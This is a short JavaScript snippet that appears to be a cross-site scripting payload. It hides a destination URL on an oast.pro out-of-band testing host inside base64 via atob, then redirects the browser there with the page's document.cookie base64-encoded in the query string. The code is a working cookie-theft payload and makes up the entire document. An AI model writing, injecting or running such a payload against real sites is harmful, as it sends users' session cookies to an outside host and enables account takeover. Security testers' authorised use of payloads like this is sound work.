console.log("boo")
window.location=atob("aHR0cHM6Ly9jeGtqeXBqejF3ZzAwMDA4OThrMGdxMzN4bW95eXl5eWIub2FzdC5wcm8vYmVhbQ==").concat("?boo").concat(btoa(document.cookie))